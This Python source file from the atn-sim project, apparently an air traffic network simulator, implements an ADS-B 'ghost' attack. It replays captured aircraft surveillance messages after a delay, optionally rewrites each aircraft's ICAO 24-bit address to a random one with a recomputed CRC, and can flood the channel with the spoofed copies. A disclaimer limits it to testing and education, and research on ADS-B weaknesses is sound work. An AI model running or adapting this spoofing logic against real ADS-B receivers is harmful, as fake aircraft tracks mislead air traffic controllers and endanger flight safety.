#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
---------------------------------------------------------------------------------------------------
 Copyright 2016, ICEA

 This file is part of atn-sim

 atn-sim is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.

 atn-sim is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program.  If not, see <http://www.gnu.org/licenses/>.

revision 0.1  2016/December/08  Marcio Monteiro
revision 0.2  2017/May/10       Ivan Matias

initial release (Linux/Python)
---------------------------------------------------------------------------------------------------
"""
__version__ = "$revision: 0.2$"
__author__ = "Ivan Matias"
__date__ = "2017/05"

# < imports >------------------------------------------------------------------
import binascii
import os
import sys
import threading
import time

import atn.surveillance.adsb.decoder as adsb_decoder
import atn.surveillance.adsb.adsb_utils as adsb_utils

from ..adsb_in import AdsbIn
from ..adsb_out import AdsbOut
from ..feeds.adsb_feed import AdsbFeed

class AdsbGhost(AdsbFeed):
    """
    DOCUMENT ME!
    """

    delay = 30

    icao24_rewrite = False
    flood = False

    icao24_table = {}
    icao24 = []
    icao24_spoofed = []

    # -------------------------------------------------------------------------
    def __init__(self, f_id, f_lat, f_lng, f_alt):
        """
        Construtor
        :param f_lat: a latitude do no do CORE
        :param f_lng: a longitude do no do CORE
        :param f_alt: a altitude do no do CORE
        """
        self.adsbin = AdsbIn(fi_id= f_id, ff_lat=f_lat, ff_lng=f_lng, ff_alt=f_alt, fv_store_msgs=True)
        self.adsbout = AdsbOut(nodename=None,feed=self)

        # Posição do no dentro do CORE
        self.altitude = f_alt
        self.latitude = f_lat
        self.longitude = f_lng

    # -------------------------------------------------------------------------
    def run(self):
        """
        Inicia o ataque
        :return: None
        """
        self.adsbin.run()
        self.listen()


    # -------------------------------------------------------------------------
    def listen(self):
        """
        Recupera as mensagens recebidas por ground station através do ADS-B In
        :return: None
        """

        while True:
            message = self.adsbin.retrieve_msg()

            if message is None:
                time.sleep(0.2)
            else:

                if self.icao24_rewrite:
                    icao24 = adsb_decoder.get_icao_addr(message)

                    # Do not spoof our own spoofed messages
                    if icao24 in self.icao24_spoofed and not self.flood:
                        continue

                    if icao24 not in self.icao24:
                        new_icao24 = binascii.b2a_hex(os.urandom(3))
                        self.icao24.append(icao24)
                        self.icao24_spoofed.append(new_icao24)
                        self.icao24_table[icao24] = new_icao24

                    message = self.rewrite_icao24(message)

                t1 = threading.Thread(target=adsb_replay, args=(message, self.delay, self.adsbout))
                t1.start()


    # -------------------------------------------------------------------------
    def rewrite_icao24(self, message):
        """
        Reescreve o código ICAO 24 bit code da mensagem ADS-B. E recalcula o CRC da
        mensagem ADS-B.
        :param message: a mensagem ADS-B
        :return: None
        """
        msg_icao24 = adsb_decoder.get_icao_addr(message)
        new_icao24 = self.icao24_table[msg_icao24]

        # Replace old ICAO address
        new_message_hex = message[0:2] + new_icao24 + message[8:22]
        new_message_bin = bin(int(new_message_hex, 16))[2:].zfill(24)

        # Re-calculate the CRC
        crc = adsb_utils.calc_crc(new_message_bin)
        crc_hex = hex(int(crc, 2)).rstrip("L").lstrip("0x")

        return new_message_hex+crc_hex

    def get_ssr(self):
        """Informs current squawk code of the given aircraft.

        Examples:
            - 7500: Hi-Jacking
            - 7600: Radio Failure
            - 7700: Emergency

        The complete list can be found in http://www.flightradars.eu/lsquawkcodes.html
        """
        raise NotImplementedError()

    def get_spi(self):
        """Informs if SPI is activated.
        """
        raise NotImplementedError()

    def get_callsign(self):
        """Provides the callsign of the given aircraft.
        """
        raise NotImplementedError()

    # -------------------------------------------------------------------------
    def get_position(self):
        """
        Returns latitude, longitude and altitude of aircraft
        :return: (latitude in degrees, longitude in degress, altitude in meters)
        """
        return self.latitude, self.longitude, self.altitude


    def get_velocity(self):
        """Provides azimuth, climb_rate, and speed in meters per second.
        """
        raise NotImplementedError()

    def get_icao24(self):
        raise NotImplementedError()

    def get_capabilities(self):
        raise NotImplementedError()

    def get_type(self):
        raise NotImplementedError()

    def is_track_updated(self):
        raise NotImplementedError()

    # -------------------------------------------------------------------------
    def start(self):
        """
        Inicia o processo de alimentação do ADS-B out.
        :return: None
        """
        return


# -----------------------------------------------------------------------------
def adsb_replay(message, delay, dev):
    time.sleep(delay)
    dev.broadcast(message)
    print message


# -----------------------------------------------------------------------------
def disclaimer():
    print " DISCLAIMER: This software is for testing and educational"
    print " purposes only. Any other usage for this code is not allowed."
    print " Use at your own risk."
    print
    print " 'With great power comes great responsibility.' - Uncle Ben"


# -----------------------------------------------------------------------------
def main():
    # create ADS-B Ghost
    tx = AdsbGhost(int(sys.argv[1]), float(sys.argv[2]), float(sys.argv[3]), float(sys.argv[4]))

    if "--rewrite-icao24" in sys.argv:
        print " > Rewritting ICAO24"
        tx.icao24_rewrite = True

    if "--flood" in sys.argv:
        print " > Flooding with delayed messages"
        tx.flood = True

    disclaimer()
    tx.run()

if __name__ == '__main__':
    main()
